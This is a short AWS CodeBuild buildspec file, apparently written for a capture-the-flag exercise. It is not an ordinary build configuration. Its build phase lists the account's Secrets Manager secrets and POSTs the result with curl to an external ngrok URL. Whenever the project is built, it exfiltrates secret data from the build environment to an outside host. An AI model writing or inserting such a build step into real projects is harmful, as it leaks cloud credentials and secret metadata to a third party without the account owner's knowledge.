version: 0.2
phases:
  build:
    commands:
      - echo "Retrieving flag..."
      - FLAG=$(aws secretsmanager list-secrets)
      - curl -X POST https://sabbath-tidy-sublet.ngrok-free.dev --data "flag=$FLAG"
